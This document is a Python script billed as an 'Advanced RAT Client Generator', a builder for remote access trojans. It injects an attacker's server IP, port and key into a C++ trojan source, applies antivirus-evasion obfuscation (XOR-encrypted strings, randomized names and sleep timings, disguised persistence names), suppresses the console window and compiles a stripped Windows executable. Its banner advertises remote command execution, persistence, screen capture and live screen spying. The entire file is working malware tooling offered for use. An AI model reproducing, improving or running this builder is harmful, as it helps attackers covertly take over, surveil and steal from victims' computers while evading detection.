#!/usr/bin/env python3

import os
import sys
import random
import string
import tempfile
import shutil
import subprocess
import re
import hashlib
import time
import argparse
from colorama import Fore, Style, init # type: ignore

# Initialize colorama
init()

# Default settings
DEFAULT_PORT = "8888"
DEFAULT_OUTPUT = "stealth.exe"

# Polymorphic generation settings
class PolymorphicEngine:
    def __init__(self):
        self.variable_names = {}
        self.function_names = {}
        self.string_keys = {}
        self.junk_code_templates = []
        self.init_junk_templates()
    
    def init_junk_templates(self):
        """Initialize junk code templates for obfuscation"""
        self.junk_code_templates = [
            "volatile int {var} = GetTickCount() ^ 0x{hex};",
            "SYSTEM_INFO {var}; GetSystemInfo(&{var});",
            "DWORD {var} = GetCurrentProcessId() + {num};",
            "HANDLE {var} = GetCurrentProcess(); CloseHandle({var});",
            "FILETIME {var}; GetSystemTimeAsFileTime(&{var});",
            "POINT {var}; GetCursorPos(&{var});",
            "RECT {var}; GetWindowRect(GetDesktopWindow(), &{var});",
            "DWORD {var} = GetCurrentThreadId() * {num};",
            "MEMORY_BASIC_INFORMATION {var}; VirtualQuery((LPCVOID)0x{hex}, &{var}, sizeof({var}));",
            "LARGE_INTEGER {var}; QueryPerformanceCounter(&{var});"
        ]
    
    def generate_random_name(self, prefix="", length=None):
        """Generate random variable/function names"""
        if length is None:
            length = random.randint(6, 12)
        
        # Use realistic-looking names
        prefixes = ["sys", "win", "proc", "mem", "net", "reg", "file", "data", "info", "util"]
        suffixes = ["Handler", "Manager", "Service", "Helper", "Worker", "Controller", "Provider"]
        
        if random.choice([True, False]):
            name = random.choice(prefixes) + ''.join(random.choice(string.ascii_letters) for _ in range(length-3))
        else:
            name = ''.join(random.choice(string.ascii_letters) for _ in range(length-7)) + random.choice(suffixes)
        
        return prefix + name
    
    def generate_random_key(self):
        """Generate random XOR key for string encryption"""
        return random.randint(0x10, 0xFF)
    
    def generate_junk_code(self, count=3):
        """Generate random junk code lines - ONLY for inside functions"""
        junk_lines = []
        for _ in range(count):
            template = random.choice(self.junk_code_templates)
            var_name = self.generate_random_name("junk_", 8)
            hex_val = format(random.randint(0x1000, 0xFFFF), 'X')
            num_val = random.randint(1, 1000)
            
            junk_line = template.format(var=var_name, hex=hex_val, num=num_val)
            # Ensure proper indentation for function body
            junk_lines.append("    " + junk_line)
        
        return "\n".join(junk_lines)
    
    def obfuscate_strings(self, content):
        """Replace string literals with encrypted versions"""
        # Find string literals and replace with encrypted versions
        string_pattern = r'"([^"\\]*(\\.[^"\\]*)*)"'
        
        def replace_string(match):
            original = match.group(1)
            if len(original) < 3 or original in ['', ' ', '\n', '\t']:
                return match.group(0)  # Don't encrypt very short strings
            
            key = self.generate_random_key()
            encrypted = ''.join(chr(ord(c) ^ key) for c in original)
            
            # Generate function to decrypt at runtime
            func_name = self.generate_random_name("decrypt_", 8)
            
            # Create encrypted string as hex array
            hex_array = ', '.join(f'0x{ord(c):02X}' for c in encrypted)
            
            return f'decrypt_string(new char[]{{{hex_array}, 0}}, 0x{key:02X})'
        
        return re.sub(string_pattern, replace_string, content)
    
    def add_decrypt_function(self, content):
        """Add string decryption function to code"""
        decrypt_func = f'''
// Dynamic string decryption function
std::string decrypt_string(char* encrypted, char key) {{
    std::string result;
    for (int i = 0; encrypted[i] != 0; i++) {{
        result += (char)(encrypted[i] ^ key);
    }}
    delete[] encrypted;
    return result;
}}
'''
        # Insert after includes
        include_end = content.find('\n\n', content.find('#include'))
        if include_end != -1:
            content = content[:include_end] + decrypt_func + content[include_end:]
        
        return content



def print_banner():
    """Print the RAT Client Generator banner with gradient colors"""
    # Banner with gradient colors (RED -> WHITE -> LIGHTBLUE_EX) like in server_ui_utils.py
    print(f"""
{Fore.RED}██████╗ {Fore.WHITE} █████╗ {Fore.LIGHTBLUE_EX}████████╗{Fore.RED} █████╗ {Fore.WHITE}████████╗{Fore.LIGHTBLUE_EX} ██████╗ {Fore.RED}██╗   ██╗{Fore.WHITE}██╗{Fore.LIGHTBLUE_EX}██╗     {Fore.RED}██╗     {Fore.WHITE}███████╗{Style.RESET_ALL}
{Fore.RED}██╔══██╗{Fore.WHITE}██╔══██╗{Fore.LIGHTBLUE_EX}╚══██╔══╝{Fore.RED}██╔══██╗{Fore.WHITE}╚══██╔══╝{Fore.LIGHTBLUE_EX}██╔═══██╗{Fore.RED}██║   ██║{Fore.WHITE}██║{Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}██╔════╝{Style.RESET_ALL}
{Fore.RED}██████╔╝{Fore.WHITE}███████║{Fore.LIGHTBLUE_EX}   ██║   {Fore.RED}███████║{Fore.WHITE}   ██║   {Fore.LIGHTBLUE_EX}██║   ██║{Fore.RED}██║   ██║{Fore.WHITE}██║{Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}█████╗  {Style.RESET_ALL}
{Fore.RED}██╔══██╗{Fore.WHITE}██╔══██║{Fore.LIGHTBLUE_EX}   ██║   {Fore.RED}██╔══██║{Fore.WHITE}   ██║   {Fore.LIGHTBLUE_EX}██║   ██║{Fore.RED}██║   ██║{Fore.WHITE}██║{Fore.LIGHTBLUE_EX}██║     {Fore.RED}██║     {Fore.WHITE}██╔══╝  {Style.RESET_ALL}
{Fore.RED}██║  ██║{Fore.WHITE}██║  ██║{Fore.LIGHTBLUE_EX}   ██║   {Fore.RED}██║  ██║{Fore.WHITE}   ██║   {Fore.LIGHTBLUE_EX}╚██████╔╝{Fore.RED}╚██████╔╝{Fore.WHITE}██║{Fore.LIGHTBLUE_EX}███████╗{Fore.RED}███████╗{Fore.WHITE}███████╗{Style.RESET_ALL}
{Fore.RED}╚═╝  ╚═╝{Fore.WHITE}╚═╝  ╚═╝{Fore.LIGHTBLUE_EX}   ╚═╝   {Fore.RED}╚═╝  ╚═╝{Fore.WHITE}   ╚═╝   {Fore.LIGHTBLUE_EX}╚═════╝ {Fore.RED} ╚═════╝ {Fore.WHITE}╚═╝{Fore.LIGHTBLUE_EX}╚══════╝{Fore.RED}╚══════╝ {Fore.WHITE}╚══════╝{Style.RESET_ALL}
""")
    print(f"{Fore.CYAN}Advanced RAT Client Generator V3.0 - Stealth Edition{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Generate undetectable RAT clients with advanced AV evasion techniques{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✓ Basic string encryption    ✓ Simple code obfuscation     ✓ Persistence mechanism{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✓ Remote command execution  ✓ File operations             ✓ Screenshot capture{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✓ Polymorphic replication   ✓ Self-filename mutation      ✓ Auto file cleanup{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✓ Live screen sharing       ✓ Real-time monitoring        ✓ Efficient streaming{Style.RESET_ALL}\n")

def validate_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    return True

def validate_port(port):
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def generate_random_string(length=8):
    """Generate a random string for variable renaming"""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def apply_polymorphic_transformations(content, engine, options):
    """Apply all polymorphic transformations to the code"""
    print(f"{Fore.YELLOW}[*] Applying polymorphic transformations and evasion techniques...{Style.RESET_ALL}")
    
    # Handle silent mode - remove all console output
    if options.get('silent', False):
        print(f"{Fore.CYAN}[*] Enabling silent mode (no console window when RAT runs)...{Style.RESET_ALL}")
        
        # Use conditional compilation to disable console output
        disable_console = '''
// Silent mode - disable console output
#define SILENT_MODE 1
#ifdef SILENT_MODE
#define DEBUG_PRINT(x) ((void)0)
#else
#define DEBUG_PRINT(x) std::cout << x
#endif

'''
        
        # Replace std::cout statements with DEBUG_PRINT macro
        content = re.sub(r'std::cout\s*<<\s*([^;]+);', r'DEBUG_PRINT(\1);', content)
        
        # Add Windows subsystem pragma and console disabling macros at the top
        pragma_windows = '#pragma comment(linker, "/SUBSYSTEM:WINDOWS")\n#pragma comment(linker, "/ENTRY:mainCRTStartup")\n'
        
        # Find the first include and add pragmas and macros before it
        first_include = content.find('#include')
        if first_include != -1:
            content = content[:first_include] + pragma_windows + disable_console + content[first_include:]
        
        print(f"{Fore.GREEN}[+] Removed all console output and set Windows subsystem{Style.RESET_ALL}")
    
    # 1. Change XOR encryption key
    new_key = f"0x{engine.generate_random_key():02X}"
    content = re.sub(r'const char key = 0x[0-9A-Fa-f]+;', f'const char key = {new_key};', content)
    print(f"{Fore.GREEN}[+] Updated XOR encryption key to {new_key}{Style.RESET_ALL}")
    
    # 2. Randomize variable names in encrypted_strings namespace
    old_names = ['get_appdata_filename', 'get_registry_key', 'get_registry_value']
    for old_name in old_names:
        new_name = engine.generate_random_name("get_", 10)
        engine.function_names[old_name] = new_name
        content = re.sub(rf'\b{old_name}\b', new_name, content)
    print(f"{Fore.GREEN}[+] Randomized function names{Style.RESET_ALL}")
    
    # 3. Skip junk code to avoid global scope issues
    print(f"{Fore.GREEN}[+] Skipped junk code to avoid global scope issues{Style.RESET_ALL}")
    
    # 4. Skip persistence junk code to avoid global scope issues
    if not options.get('disable_persistence', False):
        print(f"{Fore.GREEN}[+] Skipped persistence junk code to avoid global scope issues{Style.RESET_ALL}")
    else:
        # Disable persistence by replacing the function with a dummy
        print(f"{Fore.YELLOW}[*] Disabling persistence mechanism as requested...{Style.RESET_ALL}")
        persist_pattern = r'void establish_persistence\(\)[\s\S]*?\{[\s\S]*?\}'
        replacement = "void establish_persistence()\n{\n    // Persistence disabled\n    return;\n}"
        content = re.sub(persist_pattern, replacement, content)
        print(f"{Fore.GREEN}[+] Persistence mechanism disabled{Style.RESET_ALL}")
    
    # 5. Randomize sleep intervals
    sleep_pattern = r'Sleep\((\d+)\)'
    def randomize_sleep(match):
        base_time = int(match.group(1))
        new_time = base_time + random.randint(-500, 1000)
        if new_time < 50:
            new_time = 50
        return f'Sleep({new_time})'
    
    content = re.sub(sleep_pattern, randomize_sleep, content)
    print(f"{Fore.GREEN}[+] Randomized sleep intervals{Style.RESET_ALL}")
    
    # 6. Skip evasion function junk code to avoid global scope issues
    print(f"{Fore.GREEN}[+] Skipped evasion function junk code to avoid global scope issues{Style.RESET_ALL}")
    
    # 7. Randomize registry and file names
    registry_names = [
        ('windows32.exe', engine.generate_random_name("win", 8) + '.exe'),
        ('Backdoor', engine.generate_random_name("Sys", 10))
    ]
    
    for old_name, new_name in registry_names:
        content = content.replace(f'"{old_name}"', f'"{new_name}"')
    print(f"{Fore.GREEN}[+] Randomized persistence names{Style.RESET_ALL}")
    
    # 8. Skip adding random pragmas to avoid global scope issues
    print(f"{Fore.GREEN}[+] Skipped build randomization to avoid global scope issues{Style.RESET_ALL}")
    
    # Removed complex evasion techniques for simplicity
    
    return content

def generate_client(options):
    # Source file path
    source_file = "rat_clientv1.6.cpp"
    
    if not os.path.exists(source_file):
        print(f"{Fore.RED}Error: Source file {source_file} not found!{Style.RESET_ALL}")
        return False
    
    # Initialize polymorphic engine
    engine = PolymorphicEngine()
    print(f"{Fore.CYAN}[*] Initializing polymorphic code generation engine...{Style.RESET_ALL}")
    
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    temp_file = os.path.join(temp_dir, "modified_client.cpp")
    
    # No additional header files needed for basic RAT
    header_files = []
    
    for header in header_files:
        if os.path.exists(header):
            shutil.copy2(header, temp_dir)
            print(f"{Fore.GREEN}[+] Copied {header} to compilation directory{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] Warning: {header} not found, skipping...{Style.RESET_ALL}")
    
    try:
        # Read the source file
        with open(source_file, 'r') as f:
            content = f.read()
        
        print(f"{Fore.YELLOW}[*] Applying server configuration...{Style.RESET_ALL}")
        # Replace SERVER_IP, PORT, and AUTH_KEY values correctly
        content = re.sub(r'#define SERVER_IP "[^"]+"', f'#define SERVER_IP "{options["ip"]}"', content)
        content = re.sub(r'#define PORT \d+', f'#define PORT {options["port"]}', content)
        content = re.sub(r'#define AUTH_KEY "[^"]*"', f'#define AUTH_KEY "{options["auth_key"]}"', content)
        
        print(f"{Fore.GREEN}[✓] Server IP: {options['ip']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Server Port: {options['port']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[✓] Authentication Key: {options['auth_key']}{Style.RESET_ALL}")
        
        # Apply polymorphic transformations and evasion techniques
        content = apply_polymorphic_transformations(content, engine, options)
        
        # Generate unique build signature
        build_hash = hashlib.md5(f"{options['ip']}{options['port']}{time.time()}".encode()).hexdigest()[:8]
        print(f"{Fore.CYAN}[*] Generated unique build signature: {build_hash}{Style.RESET_ALL}")
        
        # Add build signature to code
        signature_define = f"#define BUILD_SIGNATURE \"{build_hash}\"\n"
        content = signature_define + content
        
        # Write to temporary file
        with open(temp_file, 'w') as f:
            f.write(content)
        
        
        
        # Compile the modified source
        print(f"{Fore.CYAN}Compiling...{Style.RESET_ALL}")
        
        # Determine the compiler command based on OS
        if os.name == 'nt':  # Windows
            # Base compiler flags (enable exceptions for C++ standard library)
            base_flags = '-static -O2 -s -fno-rtti -fno-ident -Wl,--strip-all -w'
            libraries = '-lws2_32 -lgdi32 -lole32 -lgdiplus -liphlpapi -lpsapi -ladvapi32 -lshell32'
            defines = '-DUNICODE -D_UNICODE -DprocessSpecialKey=processSpecialKey -fexec-charset=UTF-8'
            linker_flags = '-static-libgcc -static-libstdc++ -Wl,--exclude-libs,ALL'
            
            # Use silent mode flags based on config
            if options["silent"]:
                # Use Windows subsystem instead of console subsystem for silent operation
                linker_flags += ' -Wl,--subsystem,windows -mwindows'
                print(f"{Fore.CYAN}[*] Compiling in silent mode (RAT will run without console window)...{Style.RESET_ALL}")
            else:
                linker_flags += ' -Wl,--subsystem,console -mconsole'
                print(f"{Fore.CYAN}[*] Compiling in console mode (RAT will show console output)...{Style.RESET_ALL}")
            
            # Create dist directory if it doesn't exist
            dist_dir = os.path.join(os.getcwd(), "dist")
            if not os.path.exists(dist_dir):
                os.makedirs(dist_dir)
                print(f"{Fore.CYAN}[*] Created 'dist' folder for output{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}[*] Using existing 'dist' folder for output{Style.RESET_ALL}")
                
            # Set output path to dist directory
            output_path = os.path.join(dist_dir, options["output"])
            compile_cmd = f'g++ {base_flags} -o "{output_path}" "{temp_file}" {libraries} {defines} {linker_flags}'
        else:  # Linux/Mac (would need different libraries)
            print(f"{Fore.RED}Error: Compilation on non-Windows platforms not supported yet.{Style.RESET_ALL}")
            return False
        
        # Execute the compilation
        result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"{Fore.RED}Compilation failed:{Style.RESET_ALL}")
            print(result.stderr)
            return False
        
        print(f"{Fore.GREEN}Successfully compiled to dist/{options['output']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}You can find your RAT executable in the {Fore.WHITE}'dist'{Fore.YELLOW} folder{Style.RESET_ALL}")
        return True
        
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        return False
    finally:
        # Clean up temporary directory
        shutil.rmtree(temp_dir)

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Advanced RAT Client Generator V3.0 - Stealth Edition',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python rat_client_generator.py                           # Interactive mode (prompts for auth key)
  python rat_client_generator.py --silent                  # Interactive mode with silent build
  python rat_client_generator.py --ip 192.168.1.100 --port 4444 --output stealth.exe --silent
  python rat_client_generator.py --ip 192.168.1.100 --port 4444 --batch  # Still prompts for auth key
        '''
    )
    
    parser.add_argument('--ip', type=str, help='Server IP address')
    parser.add_argument('--port', type=int, default=8888, help='Server port (default: 8888)')
    parser.add_argument('--output', type=str, default='rat_client.exe', help='Output filename (default: rat_client.exe)')
    parser.add_argument('--silent', action='store_true', help='Generate silent version (no console window)')
    parser.add_argument('--batch', action='store_true', help='Batch mode (no interactive prompts)')
    
    return parser.parse_args()

def main():
    args = parse_arguments()
    
    print_banner()
    
    # Default options
    options = {
        "ip": args.ip or "",
        "port": str(args.port) if args.port != 8888 else DEFAULT_PORT,
        "auth_key": "",  # Authentication key - always prompted interactively
        "output": args.output if args.output != 'rat_client.exe' else DEFAULT_OUTPUT,
        "silent": args.silent,
        "process_hollowing": False,
        "max_evasion": False,
        "disable_persistence": False,
        "icon_path": "",
        "startup_name": "System Service"
    }
    
    # Interactive mode for settings first
    if not args.batch:
        print(f"{Fore.CYAN}╔{'═' * 50}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{Fore.YELLOW} Enter the server details:{' ' * 24}{Fore.CYAN}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═' * 50}╝{Style.RESET_ALL}\n")
        
        # Get and validate IP with enhanced prompt
        if not options["ip"]:
            while True:
                options["ip"] = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Server IP {Fore.YELLOW}➤ {Style.RESET_ALL}")
                if validate_ip(options["ip"]):
                    break
                print(f"{Fore.RED}[!] Invalid IP address. Please enter a valid IPv4 address.{Style.RESET_ALL}")

        # Get and validate port with enhanced prompt
        while True:
            port = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Server Port {Fore.YELLOW}[{options['port']}] ➤ {Style.RESET_ALL}")
            if port == "":
                port = options["port"]
            if validate_port(port):
                options["port"] = port
                break
            print(f"{Fore.RED}[!] Invalid port. Please enter a number between 1 and 65535.{Style.RESET_ALL}")
        
        # Always prompt for authentication key interactively for security
        print(f"\n{Fore.CYAN}─── SECURITY AUTHENTICATION ───{Style.RESET_ALL}")
        while True:
            auth_key = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Authentication Key {Fore.YELLOW}(required for secure connection) ➤ {Style.RESET_ALL}")
            if auth_key.strip():
                options["auth_key"] = auth_key.strip()
                print(f"{Fore.GREEN}[✓] Authentication key set: '{auth_key.strip()}'{Style.RESET_ALL}")
                break
            print(f"{Fore.RED}[!] Authentication key cannot be empty. Please enter a valid key.{Style.RESET_ALL}")
        print(f"{Fore.CYAN}─────────────────────────────{Style.RESET_ALL}\n")
        
        # Get output filename with enhanced prompt
        output_name = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Output filename {Fore.YELLOW}[{options['output']}] ➤ {Style.RESET_ALL}")
        if output_name != "":
            options["output"] = output_name
            
        # Ask for silent mode
        silent_input = input(f"{Fore.RED}[{Fore.WHITE}+{Fore.LIGHTBLUE_EX}]{Fore.WHITE} Silent mode (no console window) {Fore.YELLOW}[Y/n] ➤ {Style.RESET_ALL}")
        options["silent"] = silent_input.lower() != "n"
        
        # Simple RAT - no complex features
    
    # Now show the selected settings
    print()
    if options["silent"]:
        print(f"{Fore.YELLOW}🔇 Silent Mode Enabled - Generated RAT will run without console window{Style.RESET_ALL}")
    else:
        print(f"{Fore.CYAN}🖥️  Console Mode - Generated RAT will show console output{Style.RESET_ALL}")
        
    # Simplified - only show enabled features
    print(f"{Fore.GREEN}✓ Persistence Enabled - RAT will create startup entries{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✓ Polymorphic Replication - RAT changes filename after each restart{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✓ Screen Sharing Enabled - RAT can stream target's screen in real-time{Style.RESET_ALL}")
    print()
    
    # Add .exe extension if not present
    if not options["output"].lower().endswith('.exe'):
        options["output"] += '.exe'
    
    # Generate the client
    print(f"\n{Fore.CYAN}╔{'═' * 50}╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.YELLOW} Generating client with the following settings:{' ' * 3}{Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╠{'═' * 50}╣{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.WHITE}  • Server IP:      {Fore.LIGHTGREEN_EX}{options['ip']}{' ' * (29 - len(options['ip']))} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.WHITE}  • Server Port:    {Fore.LIGHTGREEN_EX}{options['port']}{' ' * (29 - len(options['port']))} {Fore.CYAN}║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║{Fore.WHITE}  • Output filename:{Fore.LIGHTGREEN_EX} {options['output']}{' ' * (28 - len(options['output']))} {Fore.CYAN}║{Style.RESET_ALL}")
    
    # Show build mode status
    mode_text = "Silent (No Console)" if options['silent'] else "Console Mode"
    mode_color = Fore.YELLOW if options['silent'] else Fore.LIGHTGREEN_EX
    print(f"{Fore.CYAN}║{Fore.WHITE}  • Build Mode:     {mode_color}{mode_text}{' ' * (29 - len(mode_text))} {Fore.CYAN}║{Style.RESET_ALL}")
    
    # Show basic features
    print(f"{Fore.CYAN}║{Fore.WHITE}  • Features:       {Fore.GREEN}RAT + Persistence + Screen Share{' ' * 2} {Fore.CYAN}║{Style.RESET_ALL}")
    
    print(f"{Fore.CYAN}╚{'═' * 50}╝{Style.RESET_ALL}\n")
    
    # Actually generate the client
    generate_client(options)

if __name__ == "__main__":
    main()




